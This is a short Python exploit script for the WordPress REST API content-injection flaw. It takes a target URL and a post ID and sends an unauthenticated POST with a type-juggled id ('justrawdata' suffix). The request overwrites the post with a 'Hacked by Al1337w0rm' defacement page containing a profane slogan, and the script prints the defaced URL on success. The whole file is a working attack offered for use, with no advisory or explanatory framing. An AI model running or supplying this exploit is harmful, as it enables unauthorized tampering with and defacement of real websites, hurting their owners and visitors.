import requests
import json

target_uri = input("Enter Target URL: ").strip()
post_id = int(input("Enter Post ID: ").strip())

data = {
    "id": f"{post_id}justrawdata",
    "title": "Hacked by Al1337w0rm",
    "slug": "pwned.htm",
    "content": "<h1>Hacked by Al1337w0rm</h1><br><pre>FUCK ISIS!</pre>"
}

headers = {
    "Content-Type": "application/json",
    "Accept": "application/json"
}

response = requests.post(
    f"{target_uri}/wp-json/wp/v2/posts/{post_id}",
    data=json.dumps(data),
    headers=headers
)

if response.status_code == 200:
    print(f"Yeah, '{target_uri}/?p={post_id}'")
else:
    print("Failed!")
